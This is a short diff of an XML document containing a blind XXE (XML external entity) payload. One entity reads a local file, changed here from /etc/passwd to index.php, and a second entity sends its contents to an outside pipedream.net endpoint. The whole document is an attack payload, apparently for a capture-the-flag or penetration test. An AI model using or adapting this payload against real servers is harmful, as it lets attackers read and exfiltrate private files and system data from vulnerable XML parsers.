@@ -1,7 +1,7 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ELEMENT foo (#ANY)>
-<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY % xxe SYSTEM "file://index.php">
 <!ENTITY blind SYSTEM "https://eodoqfgdto5tcqx.m.pipedream.net/?%xxe;">]><foo>&blind;</foo>
 
 <rss version="2.0">
